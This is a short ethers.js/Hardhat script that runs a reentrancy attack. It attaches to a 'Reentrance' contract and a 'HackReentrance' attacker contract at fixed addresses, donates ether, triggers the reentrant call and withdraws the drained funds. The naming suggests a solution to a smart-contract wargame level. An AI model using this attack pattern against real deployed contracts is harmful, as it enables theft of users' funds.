const main = async () => {
  const [signer] = await ethers.getSigners();
  const reentranceFactory = await ethers.getContractFactory('Reentrance');
  const reentrance = await reentranceFactory.attach(
    '0xca4d600eb2E542245e5A0147F521375f74160284'
  );
  const hackFactory = await ethers.getContractFactory('HackReentrance');
  const hack = await hackFactory.attach(
    '0x75eeBaA928f86d54eA7d8e5Dfd28d96bbd992A4c'
  );
  let txn = await reentrance.connect(signer).donate(hack.address, {
    value: ethers.utils.parseEther('0.5'),
  });
  await txn.wait();
  console.log('Donated to reentrance');
  txn = await hack.connect(signer).reenter(ethers.utils.parseEther('0.5'));
  await txn.wait();
  console.log('Reentered');
  txn = await hack.connect(signer).withdraw();
  await txn.wait();
};

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (e) {
    console.log(e);
    process.exit(1);
  }
};
runMain();
